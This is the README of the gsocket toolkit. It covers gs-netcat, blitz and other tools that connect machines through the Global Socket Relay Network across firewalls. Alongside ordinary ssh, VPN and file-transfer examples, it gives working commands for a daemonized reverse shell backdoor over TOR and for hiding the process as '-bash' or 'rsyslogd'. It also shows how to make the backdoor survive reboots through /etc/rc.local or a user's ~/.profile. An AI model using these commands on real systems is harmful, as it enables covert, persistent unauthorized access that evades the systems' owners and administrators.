# Global Socket
<!---
See https://shields.io/category/license
[![License: MIT](https://img.shields.io/github/license/hackerschoice/gsocket)](https://opensource.org/licenses/MIT)
[![Github file count](https://img.shields.io/github/directory-file-count/hackerschoice/gsocket\?style\=plastic)](https://GitHub.com/hackerschoice/gsocket/)
--->
[![GitHub release](https://img.shields.io/github/release/hackerschoice/gsocket\?style\=plastic)](https://github.com/hackerschoice/gsocket/releases/)
[![License](https://img.shields.io/badge/License-BSD%202--Clause-orange.svg?style=plastic)](https://opensource.org/licenses/BSD-2-Clause)
[![GitHub Build](https://img.shields.io/badge/build-passing-green.svg\?style\=plastic\&logo\=appveyor)](https://www.gsocket.io/)
[![GitHub Quality](https://img.shields.io/badge/quality-A-green.svg\?style\=plastic)](https://www.gsocket.io/)
[![GitHub Platform](https://img.shields.io/badge/platform-linux\|osx\|cygwin\|FreeBSD-green.svg\?style\=plastic)](https://www.gsocket.io/)
[![GitHub coverage](https://img.shields.io/badge/coverage-100%25-green.svg\?style\=plastic)](https://www.gsocket.io/)
[![Maintenance](https://img.shields.io/badge/Maintained-yes-green.svg\?style\=plastic)](https://github.com/hackerschoice/gsocket/graphs/commit-activity)
[![Website shields.io](https://img.shields.io/website-up-down-green-red/http/www.gsocket.io.svg\?style\=plastic)](https://www.gsocket.io/)
[![Github all downloads](https://img.shields.io/github/downloads/hackerschoice/gsocket/total\?style\=plastic)](https://GitHub.com/hackerschoice/gsocket/)
[![GitHub telegram](https://img.shields.io/badge/chat-telegram-blue.svg\?style\=plastic\&logo\=telegram)](https://t.me/thcorg/)
[![GitHub twitter](https://img.shields.io/twitter/follow/hackerschoice?label=Follow)](https://twitter.com/hackerschoice)
[![GitHub stars](https://img.shields.io/github/stars/hackerschoice/gsocket\?style\=social)](https://GitHub.com/hackerschoice/gsocket/stargazers/)

**Connect like there is no firewall. Securely.**

The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.  
More on [https://www.gsocket.io](https://www.gsocket.io).

[![Watch the video](https://www.gsocket.io/assets/images/eeelite-console-640x378.png)](https://www.youtube.com/watch?v=tmf9VGDPILE)

Video 1: [gs-netcat reverse login shell and EEElite-console](https://www.youtube.com/watch?v=tmf9VGDPILE)  
Video 2: [Using gsocket to hijack OpenSSH](https://www.youtube.com/watch?v=Nn6BAeeVJIc)  
Video 3: [Blitz files through firewalls](https://www.thc.org/gsocket-anim2.gif)  


**Features:**
- Uses the Global Socket Relay Network to connect TCP pipes
- End-2-End encryption (using OpenSSL's SRP / [RFC 5054](https://tools.ietf.org/html/rfc5054))
- AES-256 & key exchange using 4096-bit Prime
- No PKI required.
- Perfect Forward Secrecy
- TOR support (optional)

Abandon the thought of IP Addresses and Port Numbers. Instead start thinking that two programs should be able to communicate with each other as long as they know the same secret (rather than each other\'s IP Address and Port Number). The Global Socket library facilitates this: It locally derives temporary session keys and IDs and connects two programs through the Global Socket Relay Network (GSRN) regardless and independent of the local IP Address or geographical location. Once connected the library then negotiates a secure TLS connection(End-2-End). The secret never leaves your workstation. **The GSRN sees only the encrypted traffic**.

The [GSRN](https://www.gsocket.io/gsrn) is a free cloud service and is free to use by anyone.

The Global Socket Toolkit comes with a set of tools:
* **gsocket** - Makes an existing program (behind firewall or NAT) accessible from anywhere in the world. It does so by analyzing the program and replacing the IP-Layer with its own Gsocket-Layer. A client connection to a hostname ending in *'\*.gsocket'* then gets automatically redirected (via the GSRN) to this program.
* **gs-netcat** - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted reverse backdoor via TOR (optional) with a true PTY/interactive command shell (```gs-netcat -s MySecret -i```), integrated file-transfer, spawn a Socks4/4a/5 proxy or forward TCP connections or give somebody temporary shell access.
* **gs-sftp** - sftp server & client between two firewalled workstations (```gs-sftp -s MySecret```)
* **gs-mount** - Access and mount a remote file system (```gs-mount -s MySecret ~/mnt/warez```)
* **blitz** - Copy data from workstation to workstation (```blitz -s MySecret /usr/share/*```)
* ...many more examples and tools.

<A></A>|<A></A>
----------|-------------
Download|[gsocket-1.4.32.tar.gz](https://github.com/hackerschoice/gsocket/releases/download/v1.4.32/gsocket-1.4.32.tar.gz) (Linux, MacOS, FreeBSD, Solaris)
Debian/Ubuntu| [gsocket_1.4.32_all.deb](https://github.com/hackerschoice/binary/raw/main/gsocket/latest/gsocket_1.4.32_all.deb)
Windows| use docker or cygwin
Man Page| [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html), [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html), [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html), [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html), [blitz(1)](https://hackerschoice.github.io/blitz.1.html)
Docker|  docker run --rm -it hackerschoice/gsocket
Docker| docker run --rm -it hackerschoice/gsocket-tor # gs via TOR

---
**Examples**
<A></A>|<A></A>
----------|-------------
All| [examples](examples)
OpenSSH via GSRN| [examples/sshd](examples/sshd)  
WireGuard via GSRN| [examples/wireguard](examples/wireguard)  
Root-Shell via GSRN| [examples/systemd-root-shell](examples/systemd-root-shell)  
IRCD via GSRN| [examples/port-forward](examples/port-forward)  

---
<a id="installation-anchor"></a>
Follow the [Installation Instructions](https://github.com/hackerschoice/gsocket/blob/master/deploy/README.md) for all major Operating Systems.

---
**Usage:**

1. SSH from *Workstation B* to *Workstation A* through any firewall/NAT
```
$ gsocket /usr/sbin/sshd     # Workstation A
$ gsocket ssh root@gsocket   # Workstation B
```
See also: [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html)

2. OpenVPN between two firewalled workstations:
```
$ gsocket openvpn --dev tun1 --proto tcp-server --ifconfig 10.9.8.1 10.9.8.2                   # Workstation A
$ gsocket openvpn --dev tun1 --proto tcp-client --ifconfig 10.9.8.2 10.9.8.1 --remote gsocket  # Workstation B
```
See also: [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html)

3. Log in to Workstation A from Workstation B through any firewall/NAT
```
$ gs-netcat -l -i   # Workstation A
$ gs-netcat -i      # Workstation B
```
See also: [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html)

2. Transfer files from *Workstation B* to *Workstation A*
```
$ blitz -l                         # Workstation A
$ blitz /usr/share/*  /etc/*       # Workstation B
```
See also: [blitz(1)](https://hackerschoice.github.io/blitz.1.html)

3. SFTP through Global Socket Relay Network
```
$ gs-sftp -l                  # Workstation A
$ gs-sftp                     # Workstation B
```
See also: [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html)

4. Mount *Workstation A's* directory from  *Workstation B*
```
$ gs-mount -l                # Workstation A
$ gs-mount ~/mnt             # Workstation B
```
See also: [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html)

5. Pipe data from Workstation B to Workstation A
```
$ gs-netcat -l -r >warez.tar.gz    # Workstation A
$ gs-netcat <warez.tar.gz          # Workstation B
```

6. Port forward. Access 192.168.6.7:22 on Workstation's A private LAN from Workstation B:
```
# On Workstation A execute:
gs-netcat -l -d 192.168.6.7 -p 22
```
```
# On Workstation B execute:
gs-netcat -p 2222
```
```
# In a new terminal on Workstation B execute:
ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Workstation's A private LAN
```

7. Execute any command (nc -e style) on *Workstation A*
```
$ gs-netcat -l -e "echo hello world; id; exit"   # Workstation A
$ gs-netcat                                      # Workstation B
```

Another example: Spawn a new docker environment deep inside a private network
```
# Start this on a host deep inside a private network
gs-netcat -il -e "docker run --rm -it kalilinux/kali-rolling"
```

Access the docker environment deep inside the private network from anywhere in the world:
```
gs-netcat -i
```

This is particularly useful to allow fellow hackers to access a private network without having to give them access to the system itself.

8. Quick Secure Chat with a friend
```
$ gs-full-pipe -s MySecret -A               # You
$ gs-full-pipe -s MySecret -A               # Them
```

9. Access entirety of *Workstation A's* private LAN (Sock4/4a/5 proxy)
```
$ gs-netcat -l -S          # Workstation A
$ gs-netcat -p 1080        # Workstation B

Access www.google.com via Workstation A's private LAN from your Workstation B:
$ curl --socks4a 127.1:1080 http://www.google.com 

Access fileserver.local:22 on Workstation A's private LAN from your Workstation B:
$ socat -  "SOCKS4a:127.1:fileserver.local:22"
```


10. Persistant, daemonized and auto-respawn/watchdog reverse PTY backdoor via TOR
```
$ gs-netcat -l -i -D    # some firewalled server
$ gs-netcat -i -T       # You, via TOR
```

11. SoCAT 2 
```
gs-netcat can be used in a socat address-chain using the EXEC target. Happy bouncing. Enjoy. :> 
```
---
**Pro-Tips:**

1. Force TOR or fail:
Add -T to relay your traffic through TOR or use these environment variable to force TOR or fail gracefully if TOR is not running:
```
$ export GSOCKET_SOCKS_IP=127.0.0.1
$ export GSOCKET_SOCKS_PORT=9050
```

2. A reverse shell

Gs-netcat supports multiple concurrent connections and spawns a real PTY/interactive-shell with ctrl-c and colors working (like OpenSSH does).
```
$ gs-netcat -l -i    # Host
$ gs-netcat -T -i    # Workstation (via Tor & Global Socket Relay)
```

Add -D on the host side to start gs-netcat as a daemon and in watchdog-mode: Gs-netcat will restart automatically if killed.

3. Use -k

Using -s is not secure. Add your *secret* to a file and use -k &lt;filen&gt; or use GSOCKET_ARGS="-s &lt;MySecret&gt;".

```
GSOCKET_ARGS="-s MySecret" gs-netcat -l
```

Use this command to generate a new secure password at random:
```
gs-netcat -g
```

4. Hide your arguments (argv)

Pass the arguments by environment variable (GSOCKET_ARGS) and use a bash-trick to hide gs-netcat binary in the process list:
```
$ export GSOCKET_ARGS="-s MySecret -li -q -D"
$ exec -a -bash ./gs-netcat &     # Hide as '-bash'.
$ ps alxww | grep gs-netcat

$ ps alxww | grep -bash
  1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
```

5. SSH login to remote workstation
```
# On the remote workstation execute:
gs-netcat -s MySecret -l -d 192.168.6.7 -p 22
```
```
# Access 192.168.6.7 via ssh on the remote network from your workstation:
ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter
```

6. Retain access after reboot

The easiest way to retain access to a remote system is by using [the automated deploy script](https://www.gsocket.io/deploy). Alternatively the following can be used to achieve the same:

Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
```
$ cat /etc/rc.local
#! /bin/sh -e

GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"

exit 0
```
Not all environment variables are set during system bootup. Set some variables to make the backdoor more enjoyable: *TERM=xterm-256color* and *SHELL=/bin/bash* and *HOME=/root*. The startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.  

Alternatively install gs-netcat as a [systemd service](examples/systemd-root-shell).

Alternativly and if you do not have root privileges then just append the following line to the user's *~/.profile* file. This will start gs-netcat (if it is not already running) the next time the user logs in. There are [many other ways to restart a reverse shell after system reboot](https://www.gsocket.io/deploy):
```
killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
```
---
**Crypto / Security Mumble Jumble**
1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. 
2. The session key is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password).
3. The password can be 'weak' without weakening the security of the session. A brute force attack against a weak password requires a new TCP connection for every guess.
4. Do not use stupid passwords like 'password123'. Malice might pick the same (stupid) password by chance and connect. If in doubt use *gs-netcat -g* to generate a strong one. Alice's and Bob's password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect.
5. If Alice shares the same password with Bob and Charlie and either one of them connects then Alice can not tell if it is Bob or Charlie who connected.
6. Assume Alice shares the same password with Bob and Malice. When Alice stops listening for a connection then Malice could start to listen for the connection instead. Bob (when opening a new connection) can not tell if he is connecting to Alice or to Malice. Use -a &lt;token&gt; if you worry about this. TL;DR: When sharing the same password with a group larger than 2 then it is assumed that everyone in that group plays nicely. Otherwise use SSH over the GS/TLS connection.
7. SRP has Perfect Forward Secrecy. This means that past sessions can not be decrypted even if the password becomes known.
8. It is possible (by using traffic analytics) to determine that Alice is communicating with Bob. The content of such communcitation is however secret (private)  and can not be revealed by an ISP or the GSRN backend. The gsocket tools (such as gs-netcat) support the -T flag to anonymize the traffic via TOR.
9. I did not invent SRP. It's part of OpenSSL :>
---

             If netcat is a swiss army knife then gs-netcat is a germanic battle axe... 
                                                                    --acpizer/UnitedCrackingForce

Join us 

Telegram: https://t.me/thcorg 

Twitter: https://twitter.com/hackerschoice

shoutz: D1G, [@xaitax](https://twitter.com/xaitax), #!adm
